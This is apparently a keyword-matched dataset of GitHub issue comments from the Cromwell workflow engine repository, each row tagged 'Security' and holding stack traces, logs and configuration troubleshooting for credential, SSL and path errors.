role['includedPermissions",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955:1053,access,access-control,1053,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955,1,['access'],['access-control']
Security,"hi @DavyCats could you let us know:; - the git-hash of Cromwell that you built; - how you're running the workflow (eg run mode, server mode with zip, server mode with URL)?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3986#issuecomment-411172615:47,hash,hash,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3986#issuecomment-411172615,1,['hash'],['hash']
Security,hods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoi,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1685,hash,hash,1685,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hash']
Security,"https://broadworkbench.atlassian.net/browse/BA-2919; All future updates to this issue will be posted in JIRA. Sorry for the inconvenience, but you will need to create a free account to access it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2919#issuecomment-506468209:185,access,access,185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2919#issuecomment-506468209,1,['access'],['access']
Security,"idation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.Li",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:9520,validat,validateCredential,9520,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"imeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside `centaur/.../testdir`. This test passes in Travis and it might have d",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4694,validat,validation,4694,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['validat'],['validation']
Security,"ine-dispatcher-31 INFO - WorkflowManagerActor Successfully started WorkflowActor-10f172e8-b7ba-416f-964e-22ab8c7b38e3; 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2019-07-02 19:16:37,271 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2019-07-02 19:16:37,932 cromwell-system-akka.dispatchers.engine-dispatcher-29 ERROR - Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:1719,validat,validateCredential,1719,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"k that basically took in one file input and output a glob of files. We first tried this with a glob where we expected ~900 files to be output and no memory issues were found and everything went relatively smoothly. Because of some outside factors we decided to change this task to instead output ~3000 files in the glob. After about 13000 tasks were processed(Sucess -> Done) we started seeing some slow down that coincided with errors in the logs like the following:. ```; 2016-08-03 03:34:04,971 cromwell-system-akka.actor.default-dispatcher-51 WARN - Caught exception, retrying: Remote host closed connection during handshake; javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:992) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(Abstr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:1038,secur,security,1038,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"ka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972); at ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2348,secur,security,2348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
Security,"l::standardize_column_names_again::kshakir: ChangeSet changesets/standardize_column_names_again.xml::standardize_column_names_again::kshakir ran successfully in 54ms; 2018-06-07 12:16:10,880 INFO - Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; 2018-06-07 12:16:10,896 INFO - [RenameWorkflowOptionsInMetadata] 100%; 2018-06-07 12:16:10,896 INFO - changelog.xml: changesets/rename_workflow_options_in_metadata.xml::rename_workflow_options_in_metadata::tjeandet: RenameWorkflowOptionsInMetadata complete.; 2018-06-07 12:16:10,896 INFO - changelog.xml: changesets/rename_workflow_options_in_metadata.xml::rename_workflow_options_in_metadata::tjeandet: ChangeSet changesets/rename_workflow_options_in_metadata.xml::rename_workflow_options_in_metadata::tjeandet ran successfully in 17ms; 2018-06-07 12:16:10,898 INFO - changelog.xml: changesets/encrypt_and_clear_workflow_options.xml::encrypt_workflow_store_entry_workflow_options::kshakir: EncryptWorkflowStoreEntryWorkflowOptions complete.; 2018-06-07 12:16:10,899 INFO - changelog.xml: changesets/encrypt_and_clear_workflow_options.xml::encrypt_workflow_store_entry_workflow_options::kshakir: ChangeSet changesets/encrypt_and_clear_workflow_options.xml::encrypt_workflow_store_entry_workflow_options::kshakir ran successfully in 1ms; 2018-06-07 12:16:10,900 INFO - changelog.xml: changesets/encrypt_and_clear_workflow_options.xml::clear_metadata_entry_workflow_options::kshakir: ClearMetadataEntryWorkflowOptions complete.; 2018-06-07 12:16:10,900 INFO - changelog.xml: changesets/encrypt_and_clear_workflow_options.xml::clear_metadata_entry_workflow_options::kshakir: ChangeSet changesets/encrypt_and_clear_workflow_options.xml::clear_metadata_entry_workflow_options::kshakir ran successfully in 0ms; 2018-06-07 12:16:10,902 INFO - changelog.xml: changesets/sub_workflow_store.xml::SUB_WORKFLOW_STORE_ENTRY::tjeandet: Table SUB_WORKFLOW_STORE_ENTRY created; 2018-06-07 12:16:10,902 ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:69912,Encrypt,EncryptWorkflowStoreEntryWorkflowOptions,69912,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['Encrypt'],['EncryptWorkflowStoreEntryWorkflowOptions']
Security,la:412) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.util.TryUtil$$anonfun$4.apply(TryUtil.scala:64) ~[classes/:na]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.util.TryUtil$.retryBlock(TryUtil.scala:64) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$.withRetry(JesBackend.scala:113) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:412) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.authentication.JesAuthentication$class.authenticateAsCromwell(JesAuthentication.scala:39) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.authenticateAsCromwell(JesBackend.scala:161) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:542) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:541) [classes/:na]; at scala.util.Success.flatMap(Try.scala:231) [scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:541) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:285) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:275) [classes/:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [scala-library-2.11.7.jar:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486:4098,authenticat,authenticateAsCromwell,4098,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486,1,['authenticat'],['authenticateAsCromwell']
Security,"la:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:6845,secur,security,6845,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,lasses/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.util.TryUtil$$anonfun$4.apply(TryUtil.scala:64) ~[classes/:na]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.util.TryUtil$.retryBlock(TryUtil.scala:64) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$.withRetry(JesBackend.scala:113) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:412) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.authentication.JesAuthentication$class.authenticateAsCromwell(JesAuthentication.scala:39) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.authenticateAsCromwell(JesBackend.scala:161) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:542) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:541) [classes/:na]; at scala.util.Success.flatMap(Try.scala:231) [scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:541) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:285) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:275) [classes/:na]; at scala.concurrent.impl.Future$Promise,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486:3951,authenticat,authentication,3951,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486,1,['authenticat'],['authentication']
Security,lesystems.sra.SraPath.nioPath(SraPathBuilder.scala:31); 	at cromwell.core.path.Path.nioPathPrivate(PathBuilder.scala:113); 	at cromwell.core.path.Path.nioPathPrivate$(PathBuilder.scala:113); 	at cromwell.filesystems.sra.SraPath.nioPathPrivate(SraPathBuilder.scala:26); 	at cromwell.core.path.PathObjectMethods.hashCode(PathObjectMethods.scala:18); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.disp,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1277,hash,hashing,1277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hashing']
Security,"lo:NA:1]: Error attempting to Execute; cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; ```; I had set up my credentials with:; ```; export GOOGLE_APPLICATION_CREDENTIALS=sa.json; ```; and had this configuration in `google.conf` copied from the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/):; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }; ```; That clearly did not work. I tried to follow the logic in this post. I followed Horneth suggestion to use `service-account`'s authorization and I took the [auths](https://cromwell.readthedocs.io/en/develop/backends/Google/) configuration and changed `pem-file` to `json-file` in `google.conf` as follows:; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""service_account""; scheme = ""service_account""; service-account-id = ""xxx@xxx.iam.gserviceaccount.com""; json-file = ""sa.json""; }; ]; }. engine {; filesystems {; gcs {; auth = ""service_account""; project = ""xxx""; }; }; }; ```; And I have replaced every other instance of `auth = ""application-default""` with `auth = ""service_account""`. Now when I run Cromwell:; ```; java -Dconfig.file=google.conf -jar cromwell-52.jar run hello.wdl -i hello.inputs; ```; I don't get the error anymore. I do get a different error:; ```; [2020-07-27 22:54:56,48] [info] WorkflowManagerActor Workflow 0fb5e69d-7d70-407e-9fe2-bf7cb2b2c3e6 failed (during ExecutingWorkflowState): java.lang.Exception: Task wf_hello.hello:NA:1 failed. The job was stopped before the command fin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906:1156,authoriz,authorization,1156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906,2,['authoriz'],['authorization']
